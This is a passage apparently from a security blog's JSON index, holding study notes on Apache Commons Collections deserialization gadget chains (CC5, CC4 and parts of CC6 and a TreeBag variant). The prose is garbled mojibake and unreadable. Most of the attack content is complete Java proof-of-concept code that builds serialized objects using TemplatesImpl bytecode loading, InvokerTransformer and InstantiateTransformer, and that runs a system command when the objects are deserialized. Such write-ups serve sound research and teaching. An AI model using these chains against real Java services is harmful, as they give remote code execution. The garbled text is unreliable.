è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\néœ€è¦æ³¨æ„çš„åœ°æ–¹å’Œå‰é¢HashMapåˆ©ç”¨é“¾å·®ä¸å¤šï¼Œè¯´åˆ°åº•è¿™ä¸ªHashSetä¹Ÿå°±æ˜¯é—´æ¥è°ƒç”¨HashMapçš„putæ–¹æ³•ï¼Œæœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚\nå¥½å¤„ è¿™ä¸¤ä¸ªåˆ©â½¤é“¾å¯ä»¥åœ¨Java 7å’Œ8çš„â¾¼ç‰ˆæœ¬è§¦å‘ï¼Œåº”è¯¥æ˜¯é€šæ€Java7ã€8ç‰ˆæœ¬çš„ã€‚\n","date":"2025-01-22T13:58:13+08:00","permalink":"https://fupanc-w1n.github.io/p/cc6/","title":"CC6"},{"content":"CC5 åœ¨å‰é¢CC6çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬åœ¨æ‰¾LazyMap.get()çš„å…¶ä»–è°ƒç”¨é“¾æ—¶ï¼Œæ‰¾åˆ°äº†org.apache.commons.collections.keyvalue.TiedMapEntryç±»ï¼Œåœ¨CC6ä¸­ï¼Œæˆ‘ä»¬ç€é‡äºè°ƒç”¨TiedMapEntryç±»hashCode()æ–¹æ³•ä»è€Œå¯ä»¥è°ƒç”¨åˆ°getValue()æ–¹æ³•ï¼š\nä½†æ˜¯çºµè§‚TiedMapEntryç±»çš„æºç ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªtoString()æ–¹æ³•ï¼š\nè¿™ä¸ªç±»ä¹Ÿå¯ä»¥è°ƒç”¨åˆ°TiedMapEntryç±»çš„getValue()æ–¹æ³•ï¼Œç°åœ¨å°±æ˜¯çœ‹æ˜¯å¦è¿˜æœ‰å“ªä¸ªç±»å¯ä»¥è°ƒç”¨åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯CC5è¦è§£å†³çš„é—®é¢˜ã€‚\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u411 commons-collections 3.2.1 ä»£ç è°ƒè¯• åœ¨ysoserialé“¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹è§æ–°åˆ©ç”¨åˆ°äº†ä¸€ä¸ªç±»ï¼ŒBadAttributeValueExpExceptionï¼Œè¿™ä¸ªç±»ä½äºjavax.management.BadAttributeValueExpExceptionï¼Œ\nè¿™é‡Œéœ€è¦çŸ¥é“ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œä½†åªè¦æŸä¸ªç±»çš„ç¥–å…ˆç±»ï¼ˆçˆ¶ç±»ã€ç¥–çˆ¶ç±»ç­‰ï¼‰å®ç°äº†Serializableæ¥å£ï¼Œé‚£ä¹ˆå…¶æ‰€æœ‰å­ç±»ä¹Ÿè¢«è®¤ä¸ºæ˜¯å¯åºåˆ—åŒ–çš„ã€‚\nBadAttributeValueExceptionç±»éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class BadAttributeValueExpException extends Exception { private static final long serialVersionUID = -3105272988410493376L; private Object val; public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } public String toString() { return \u0026#34;BadAttributeValueException: \u0026#34; + val; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } } è™½ç„¶è¿™ä¸ªç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œä½†æ˜¯å…¶çˆ¶ç±»Exceptionçš„çˆ¶ç±»Throwableå®ç°äº†Serializableæ¥å£ï¼Œæ‰€ä»¥BadAttributeValueExceptionä¹Ÿæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚\nä¸ªäººæ€è€ƒ ç°åœ¨ç»§ç»­æ¥çœ‹æºç ï¼Œæˆ‘çœ‹åˆ°äº†è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š è¿™æ˜¯ä¸€ä¸ªä¸‰å…ƒæ“ä½œç¬¦ï¼Œå¦‚æœvalä¸ä¸ºnullï¼Œåˆ™è¿”å›val.toString()ï¼Œæ—¢ç„¶è¿™é‡Œæ˜¯æ„é€ æ–¹æ³•ï¼Œæˆ‘æƒ³åˆ°äº†CC3çš„åˆ©ç”¨æ–¹æ³•ï¼Œåªè¦æˆ‘ä»¬æ„é€ äº†valä¸ºæˆ‘ä»¬è®¾ç½®å¥½çš„TiedMapEntryç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦èƒ½å¤ŸæˆåŠŸè°ƒç”¨ã€‚\nåœ¨CC3åˆ©ç”¨åˆ°äº†InstantiateTransformerç±»ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œå†å°è¯•åˆ©ç”¨ä¸€ä¸‹ã€‚\næƒ³äº†ä¸€ä¸‹ï¼Œç†è®ºä¸Šåº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œæ²¡å¾—å¥½å¤§æ„ä¹‰å—ï¼Œå› ä¸ºæœ€ç»ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¿˜æ˜¯éœ€è¦è°ƒç”¨å…¶ä»–ç±»çš„readObject()ï¼Œä»¥CC3çš„HashMapä¸ºä¾‹ï¼Œè¿˜æ˜¯æ„å»ºä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); //é”™è¯¯ç‚¹ hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ä»£ç æœ‰é—®é¢˜ï¼Œåœ¨è¿è¡Œåæ˜¯æˆåŠŸåœ¨putéƒ¨åˆ†å¼¹å‡ºè®¡ç®—æœºï¼Œè¿™è¯´æ˜ä»£ç é€»è¾‘åº”è¯¥æ²¡é—®é¢˜ï¼Œå¹¶ä¸”è·Ÿæºç å‘ç°å‰é¢ç¡®å®åœ¨æŒ‰é¢„æœŸèµ°ï¼Œåœ¨å¼¹å‡ºè®¡ç®—æœºååœ¨åé¢çš„InstantiateTransformer#transformeçš„catchçš„var6éƒ¨åˆ†åä¸€ç‚¹çªç„¶ç»“æŸäº†ï¼Œå¯¼è‡´ç¨‹åºç›´æ¥ç»“æŸï¼Œè®©åé¢çš„removeå’Œåºåˆ—åŒ–ç­‰æ“ä½œéƒ½æ— æ³•å®ç°ï¼Œæœ‰ç‚¹æ€ªï¼Œå…ˆé—ç•™è¿™ä¸ªé—®é¢˜ï¼Œç­‰åé¢å­¦æ·±äº†å†æ¥æƒ³ã€‚\né™¤äº†ä¸Šé¢æ— æ³•å…¨éƒ¨è¿è¡Œçš„é—®é¢˜ï¼Œè¿˜æœ‰çœ‹ä»£ç ï¼Œå…¶å®å¯ä»¥è¯´æ˜¯å¤šæ­¤ä¸€ä¸¾äº†ï¼Œå®šä¹‰äº†ä¸¤ä¸ªTiedMapEntryæ¥å®ç°ï¼Œå°±ç®€å•äº†è§£ä¸€ä¸‹å°±è¡Œäº†ã€‚\nç°åœ¨æ¥å°è¯•è§£å†³ä¸€ä¸‹ï¼Œæ—¢ç„¶é—®é¢˜æ˜¯åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å¼¹å‡ºè®¡ç®—æœºï¼Œå¹¶ä¸”è°ƒè¯•äº†ä¸€ä¸‹ï¼Œé—®é¢˜åº”è¯¥æ˜¯åœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç è¿™é‡Œï¼Œç»“åˆå…¨éƒ¨CCé“¾çš„çŸ¥è¯†ç‚¹ï¼Œé‚£ä¹ˆæ˜¯å¦æˆ‘ä»¬å¯ä»¥å…ˆå‡å†çœŸå‘¢ï¼Ÿ\nå°è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); Field field1 = chain.getClass().getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœº\næ­£å¼å­¦ä¹  ç»§ç»­çœ‹æºç ï¼Œæˆ‘ä»¬çœ‹BadAttributeValueExpExceptionçš„readObject()æ–¹æ³•ï¼Œè¿™é‡Œä¹Ÿåˆ©ç”¨äº†toString()æ–¹æ³•ï¼š\nçœ‹è¿™ä¸ªreadObject()æ–¹æ³•ï¼ŒvalObjæ˜¯ä»gfä¸­çš„valå‚æ•°è·å–çš„ï¼Œè€Œgfåˆæ˜¯ä»ååºåˆ—åŒ–æµä¸­è¯»å–çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦æ§åˆ¶äº†BadAttributeValueExpExceptionç±»çš„valå‚æ•°ï¼Œå°±ç›¸å½“äºæ§åˆ¶äº†valObjï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦å°†valè®¾ç½®ä¸ºTiedMapEntryç±»çš„å®ä¾‹ã€‚\nç»§ç»­çœ‹ä»£ç ï¼Œåªè¦æˆ‘ä»¬ä¼ å…¥çš„valçš„å€¼ä¸æ˜¯Stringç±»å‹ï¼Œå¹¶ä¸”ç¬¦åˆç¬¬ä¸‰ä¸ªæ¡ä»¶ä¸­çš„çš„ä»»æ„ä¸€ä¸ªï¼Œå°±å¯ä»¥æˆåŠŸè¿›å…¥ç¬¬ä¸‰ä¸ªæ¡ä»¶çš„è¯­å¥ï¼Œä»è€Œå¯ä»¥æ‰§è¡ŒTiedMapEntryç±»çš„toString()æ–¹æ³•ã€‚\nåœ¨javaä¸­ï¼ŒSysyem.getSecurityManager()çš„è¿”å›å€¼é»˜è®¤æ˜¯nullï¼Œçœ‹å¦‚ä¸‹æµ‹è¯•è¯­å¥ï¼š\næ‰€ä»¥ä¸€èˆ¬æ˜¯å¯ä»¥è¿›å…¥åˆ°è¿™ä¸ªè¯­å¥çš„ã€‚\né‚£ä¹ˆç°åœ¨å°±å·®æ„é€ äº†ï¼Œæ€è·¯å°±æ˜¯å°†ä¸€ä¸ªè®¾ç½®å¥½äº†çš„TiedMapEntryç±»ä¼ ç»™valå°±è¡Œï¼Œç»“åˆå‰é¢å­¦è¿‡çš„ä»£ç ï¼Œå¯ä»¥å…ˆéšä¾¿ä¼ ï¼Œå†åå°„ä¿®æ”¹å³å¯ï¼Œæ‰€ä»¥å¯ä»¥å¦‚ä¸‹æ„é€ ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); Map hash = new HashMap(); Map lazy = LazyMap.decorate(hash,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Object o = new BadAttributeValueExpException(null); Field x = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); x.setAccessible(true); x.set(o,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nåŒæ ·çš„å¦‚æœä½ æƒ³ä½¿ç”¨å…¶ä»–ç±»å‹ï¼Œæ¯”å¦‚ç»“åˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ä¹‹ç±»çš„ï¼ŒåŸºæœ¬éƒ½æ˜¯åªç”¨æ”¹ä¸€ä¸‹chainParté‚£é‡Œçš„é“¾å°±è¡Œã€‚\né—®é¢˜ å­çˆ¶ç±»çš„åºåˆ—åŒ–é—®é¢˜ ","date":"2025-01-22T13:56:03+08:00","permalink":"https://fupanc-w1n.github.io/p/cc5/","title":"CC5"},{"content":"CC4 ysoserialé“¾ä¸­çš„CC4å°±åªæ˜¯å°†CC2ä½¿ç”¨çš„InvokerTransformeræ›¿æ¢ä¸ºInstantiateTransformeræ¥åŠ è½½å­—èŠ‚ç ï¼Œå…·ä½“ä½¿ç”¨CC3é‚£é‡Œå·²ç»è¯´è¿‡äº†ã€‚\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 8U411 commons-collections4.0 ä¸å¤šè¯´ï¼Œç»™ä¸ªPOCç»“æŸï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æœ‰ç‚¹å°æ€ªçš„å°±æ˜¯ä¹‹å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼ŒæŒ‰ç…§é¢„æœŸåº”è¯¥æ˜¯ä¸¤ä¸ªçš„ï¼Œè°ƒè¯•å™¨ä¹Ÿæœ‰ç‚¹å°é—®é¢˜ã€‚\nè¡¥å…… æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8U411 commons-collections4.0 è¿™é‡Œè¡¥å……ä¸€ä¸ªå¯¹PriorityQueueçš„æ›¿ä»£é“¾ TreeBagã€‚\nç›´æ¥ä¸Šå¯¹ç±»çš„åˆ†æ\nTreeBag\u0026amp;TreeMap åœ¨ CC2 ä¸­ï¼Œä½¿ç”¨äº†ä¼˜å…ˆçº§é˜Ÿåˆ— PriorityQueue ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ comparator çš„ compare æ–¹æ³•çš„ç‰¹æ€§ï¼Œé…åˆ TransformingComparator è§¦å‘ transformerã€‚\nåœ¨è¿™é‡ŒTreeBagä¹Ÿå®ç°äº†åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨åˆ°æ¯”è¾ƒå™¨ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿå¯ä»¥åˆ©ç”¨ã€‚\nTreeBagç±»ä½äºorg.apache.commons.collections4.bag.TreeBag\nç¨å¾®è¯´æ˜ä¸€ä¸‹Bagï¼š\nBag æ¥å£ç»§æ‰¿è‡ª Collection æ¥å£ï¼Œå®šä¹‰äº†ä¸€ä¸ªé›†åˆï¼Œè¯¥é›†åˆä¼šè®°å½•å¯¹è±¡åœ¨é›†åˆä¸­å‡ºç°çš„æ¬¡æ•°ã€‚å®ƒæœ‰ä¸€ä¸ªå­æ¥å£ SortedBagï¼Œå®šä¹‰äº†ä¸€ç§å¯ä»¥å¯¹å…¶å”¯ä¸€ä¸é‡å¤æˆå‘˜æ’åºçš„ Bag ç±»å‹ã€‚\nTreeBag æ˜¯å¯¹ SortedBag çš„ä¸€ä¸ªæ ‡å‡†å®ç°ã€‚TreeBag ä½¿ç”¨ TreeMap æ¥å‚¨å­˜æ•°æ®ï¼Œå¹¶ä½¿ç”¨æŒ‡å®š Comparator æ¥è¿›è¡Œæ’åºã€‚\nâ€”â€”â€”â€”\nTreeBag ç±»ç»§æ‰¿è‡ª AbstractMapBagï¼Œå®ç°äº† SortedBag æ¥å£ã€‚åˆå§‹åŒ– TreeBag æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ TreeMap å‚¨å­˜åœ¨AbstractMapBagçš„æˆå‘˜å˜é‡ map é‡Œï¼Œè€Œæ’åºä½¿ç”¨çš„ Comparator åˆ™ç›´æ¥å‚¨å­˜åœ¨ TreeMap ä¸­ï¼š\nTreeBagç±»æ„é€ æ–¹æ³•ï¼š\nçˆ¶ç±»AbstractMapBagï¼š\nTreeMapå®šä¹‰æœ‰comparatorï¼š\nå½“å¯¹TreeBagååºæ—¶ï¼š å¯ä»¥çœ‹å‡ºè¿™é‡Œä¼šè¯»å–TreeMapçš„comparatorå¹¶è°ƒç”¨çˆ¶ç±»AbstractMapBagçš„doReadObject()æ–¹æ³•ï¼š è¿™é‡Œä¼šè°ƒç”¨map.put()ï¼Œä¹Ÿå°±æ˜¯TreeMapçš„putæ–¹æ³•ï¼š çœ‹æˆ‘æ ‡é‡ç‚¹éƒ¨åˆ†ï¼Œåœ¨å‰é¢çš„ç®€å•è¿‡ç¨‹ä¸­ï¼Œè¿™é‡Œä¼šè¿›å…¥ifæ¡ä»¶å¾ˆæ­£å¸¸ï¼ˆå¹¶ä¸”åˆ©ç”¨ç‚¹å°±æ˜¯è¿™é‡Œï¼Œè‡³äºä¸ºä»€ä¹ˆåé¢å†è¯´æ˜ï¼‰ï¼Œè¿™é‡Œå°±ä¼šæ‰§è¡Œcompareæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹TreeMapç±»çš„compare()æ–¹æ³•ï¼š åªè¦æˆ‘ä»¬æ­£ç¡®å®šä¹‰äº†comparatorå°±å¯ä»¥æˆåŠŸæ‰§è¡Œæ¼æ´ã€‚\né“¾å­ä¸å°±å‡ºæ¥äº†å—ã€‚\nä¸¤ä¸ªç‚¹éœ€è¦è¯´æ˜ ç¬¬ä¸€ä¸ª 1.çˆ¶ç±»AbstractMapBagçš„å˜é‡mapä¸å¯è¢«åºåˆ—åŒ–ï¼š\nè§£å†³æ–¹æ³•åŒæ ·æ˜¯åœ¨TreeBagçš„writeObject()ä»¥åŠreadObject()æ–¹æ³•ä¸­ï¼š writeObject()ï¼š ç»§ç»­è·Ÿè¿›this.comparator()ï¼š ç„¶ååˆ°ä¼šåˆ°çˆ¶ç±»AbstractMapBagçš„getMap()æ–¹æ³•ï¼š è¿”å›äº†æˆ‘ä»¬å®šä¹‰çš„TreeMapå®ä¾‹ï¼Œæ‰€ä»¥å‰é¢çš„comparator()ä¸­ä¼šè°ƒç”¨TreeMapç±»çš„comparator()ï¼š ç›´æ¥è¿”å›äº†æˆ‘ä»¬å®šä¹‰çš„comparatorã€‚æ‰€ä»¥åºåˆ—åŒ–çš„æ—¶å€™ä¼šåºåˆ—åŒ–æˆ‘ä»¬å®šä¹‰çš„comparatorï¼š\nâ€”â€”\né‚£ä¹ˆçœ‹ååºåˆ—åŒ–ï¼š æ‰€ä»¥è¿™é‡Œåˆå°†è¿™ä¸ªcomparatorååºåˆ—åŒ–äº†å‡ºæ¥ã€‚\né‚£ä¹ˆè¿™æ ·è¿‡åå°±å¯ä»¥è§£å†³transienté—®é¢˜ã€‚\nç¬¬äºŒä¸ª 2.ä¹Ÿå°±æ˜¯forå¾ªç¯ä¸èƒ½è¿›å»çš„é—®é¢˜ï¼š æƒ³è¦è¿›å…¥forå¾ªç¯ï¼Œè¿™é‡Œä¸entrySize()æœ‰å…³ï¼Œè€ŒentrySizeçš„å€¼åˆä¸in.readInt()æœ‰å…³ã€‚\næ­¤æ—¶åŒæ ·éœ€è¦çœ‹TreeBagçš„writeObject()æ–¹æ³•ï¼Œå‰é¢è¿˜æ²¡æœ‰åˆ†æå®Œï¼š\nè¿™é‡Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™åŒæ ·è¦è¿›å…¥çˆ¶ç±»ä¸€æ¬¡ï¼ŒAbstractMapBagçš„doWriteObject()æ–¹æ³•å¦‚ä¸‹ï¼š ä¸€çœ¼å‡ºæ¥ï¼Œå°±æ˜¯å’Œè¿™é‡Œçš„writeInt()æœ‰å…³ï¼Œè€ŒwriteInt()åˆä¸TreeMapçš„size()å‡½æ•°æœ‰å…³ï¼š æ­¤æ—¶æƒ³åˆ°äº†å‰é¢cc2å¯¹è¿™ä¸ªsizeçš„æè¿°ï¼Œç›´æ¥çŒœä¸€æ³¢å’Œadd()ç›¸å¹²ï¼ŒTreeMapæœ‰addæ–¹æ³•ï¼Œä½†æ˜¯è¿˜æ˜¯ç›¸å½“äºç›´æ¥è°ƒç”¨çš„çˆ¶ç±»AbstractMapBagçš„add()æ–¹æ³•ï¼š é‡Œé¢ä¼šè°ƒç”¨TreeMapçš„get()æ–¹æ³•ï¼š 